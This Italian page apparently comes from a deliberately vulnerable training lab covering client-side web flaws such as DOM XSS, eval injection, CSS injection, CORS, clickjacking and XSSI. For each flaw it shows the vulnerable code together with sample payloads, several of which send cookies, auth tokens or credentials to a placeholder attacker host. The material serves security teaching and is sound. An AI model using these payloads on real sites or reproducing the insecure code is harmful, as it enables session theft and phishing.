4.11.1 – DOM-Based XSS

Il valore del parametro name nell'URL viene inserito direttamente nel DOM tramite innerHTML.

Esempi:

  • ?name=<img src=x onerror=alert('XSS')> — tag immagine con handler
  • ?name=<svg onload=alert(document.domain)> — SVG onload
  • ?name=<details open ontoggle=alert(1)>click</details> — evento ontoggle
  • ?name=<marquee onstart=alert(document.cookie)>XSS</marquee> — tag obsoleto
  • ?name=<iframe srcdoc="<script>alert('XSS')</script>"> — iframe srcdoc
Nessun input ricevuto.
Codice vulnerabile 
const params = new URLSearchParams(location.search);
const name = params.get('name');
if (name) {
  document.getElementById('domxss-output').innerHTML = 'Ciao, ' + name;
}

4.11.2 – JavaScript Execution

L'input dell'utente viene passato direttamente a eval().

Esempi:

  • alert('JS Exec!') — popup semplice
  • document.cookie — leggi i cookie
  • document.location='https://evil.example.com?c='+document.cookie — cookie stealing
  • fetch('/api/user').then(r=>r.text()).then(alert) — esfiltrazione dati via fetch
  • new Image().src='https://evil.example.com/log?d='+localStorage.getItem('auth_token') — exfil token
Codice vulnerabile 
function jsExec() {
  const code = document.getElementById('jsexec-input').value;
  const result = eval(code);                   // ← VULNERABILE
  document.getElementById('jsexec-output').textContent = 'Risultato: ' + result;
}

4.11.3 – HTML Injection

L'input viene inserito nel DOM usando innerHTML senza sanitizzazione.

Esempi:

  • <h1 style="color:red">INIETTATO</h1> — heading iniettato
  • <form action="https://evil.example.com"><input name=user placeholder="Username"><input type=password name=pw placeholder="Password"><button>Login</button></form> — phishing form
  • <a href="javascript:alert(1)">Clicca qui per il premio!</a> — link malevolo
  • <table><tr><td>Nome</td><td>ADMIN</td></tr></table> — sovrascrittura dati visivi
Codice vulnerabile 
function htmlInject() {
  const html = document.getElementById('html-input').value;
  document.getElementById('html-output').innerHTML = html;  // ← VULNERABILE
}

4.11.4 – Client-side URL Redirect

Il parametro redirect nell'URL viene usato per reindirizzare senza validazione.

Prova: ?redirect=https://evil.example.com

Codice vulnerabile 
const redir = new URLSearchParams(location.search).get('redirect');
if (redir) { location.href = redir; }   // ← VULNERABILE: open redirect

4.11.5 – CSS Injection

Il parametro color nell'URL viene inserito direttamente in uno <style>.

Esempi:

  • red;} body{background:red — escape della regola + override sfondo
  • green;} *{display:none — nascondi l'intera pagina (defacement)
  • blue;} body::after{content:'HACKED';font-size:5em;color:red;position:fixed;top:40%;left:30% — defacement con pseudo-elemento
  • red;} input[value^="a"]{background:url('https://evil.example.com/?leak=a')} — CSS exfil (attribute selector)
Questo testo cambierà colore.
Codice vulnerabile 
function cssInject() {
  const color = document.getElementById('css-input').value;
  const style = document.createElement('style');
  style.textContent = '#css-target { color: ' + color + '; }'; // ← VULNERABILE
  document.head.appendChild(style);
}

4.11.6 – Client-side Resource Manipulation

L'attributo src di un'immagine e lo href di un link vengono controllati dall'URL.

Prova: ?img=https://evil.example.com/fake.png

Link: Clicca qui

Codice vulnerabile 
function resourceManip() {
  const url = document.getElementById('resource-input').value;
  document.getElementById('resource-img').src = url;          // ← VULNERABILE
  document.getElementById('resource-link').href = url;        // ← VULNERABILE
}

4.11.7 – Cross Origin Resource Sharing

Il server risponde con Access-Control-Allow-Origin: * e Allow-Credentials: true.

Clicca per leggere dati sensibili dall'API.

Codice vulnerabile 
// server.js
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');

// Un attaccante su evil.com può fare:
fetch('http://localhost:3000/api/user')
  .then(r => r.json())
  .then(data => {
    // Dati sensibili ora accessibili cross-origin
  });

4.11.8 – Cross Site Flashing

Adobe Flash è deprecato (EOL dicembre 2020). Questa vulnerabilità è ormai storica.

⚠️ Flash Player non è più supportato dai browser moderni.

Storicamente, file .swf potevano essere manipolati tramite parametri FlashVars o tramite l'interfaccia ExternalInterface per eseguire JavaScript nel contesto della pagina host.

Esempio storico di URL vulnerabile:
http://example.com/player.swf?callback=javascript:alert('XSS')

4.11.9 – Clickjacking

Questa pagina non invia gli header X-Frame-Options né Content-Security-Policy: frame-ancestors, quindi può essere inclusa in un <iframe> su un sito malevolo.

Simulazione: il bottone "Elimina Account" è nascosto sotto "Vinci un premio!"

Codice vulnerabile 
// Il server NON invia questi header protettivi:
// X-Frame-Options: DENY
// Content-Security-Policy: frame-ancestors 'self'

// Un attaccante può includere la pagina in un iframe:
<iframe src="http://localhost:3000" style="opacity:0.01"></iframe>

4.11.10 – WebSockets

Il server WebSocket accetta connessioni da qualsiasi origine e fa eco dei messaggi senza sanitizzazione.

Esempi di messaggi malevoli:

  • <img src=x onerror=alert('WS-XSS')> — XSS via WebSocket
  • <a href="javascript:alert(document.cookie)">Clicca</a> — link JS nel messaggio
  • <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#fff;z-index:9999">HACKED</div> — overlay
Codice vulnerabile 
// Server: nessun controllo sull'Origin
wss.on('connection', (ws) => {
  ws.on('message', (data) => {
    // Broadcast senza sanitizzazione
    wss.clients.forEach(c => c.send(data.toString()));
  });
});

// Client: inserimento diretto nel DOM
ws.onmessage = (e) => {
  outputDiv.innerHTML += e.data;  // ← VULNERABILE
};

4.11.11 – Web Messaging

La pagina accetta postMessage da qualsiasi origine senza verificare event.origin.

Esempi (da incollare nella console del browser):

  • window.postMessage('<b>Iniettato!</b>','*') — HTML injection via postMessage
  • window.postMessage('<img src=x onerror=alert(document.domain)>','*') — XSS via postMessage
  • window.postMessage('<form action=https://evil.example.com><input name=token><button>Invia</button></form>','*') — phishing form iniettato
In attesa di messaggi…
Codice vulnerabile 
window.addEventListener('message', function(event) {
  // ⚠️ Nessun controllo su event.origin!
  document.getElementById('msg-output').innerHTML = event.data;
});

4.11.12 – Browser Storage

Dati sensibili salvati in localStorage e sessionStorage senza cifratura, accessibili da qualsiasi script nella stessa origine.

Codice vulnerabile 
// Salvare dati sensibili in chiaro nel browser storage
localStorage.setItem('auth_token', 'eyJhbGciOiJIUzI1NiJ9.secret');
localStorage.setItem('user_password', 'P@ssw0rd123!');
sessionStorage.setItem('credit_card', '4111-1111-1111-1111');

// Qualsiasi script (anche iniettato via XSS) può leggere:
const token = localStorage.getItem('auth_token');

4.11.13 – Cross Site Script Inclusion (XSSI)

Il server espone dati sensibili come file JavaScript globale. Un attaccante può includerlo con <script src="…"> dal proprio sito.

Codice vulnerabile 
// Server serve dati sensibili come JS eseguibile:
//   GET /api/data.js → var sensitiveData = { users: [...] };

// Attaccante su evil.com:
<script src="http://localhost:3000/api/data.js"></script>
<script>
  // Ora sensitiveData è accessibile!
  fetch('https://evil.com/steal?d=' + JSON.stringify(sensitiveData));
</script>
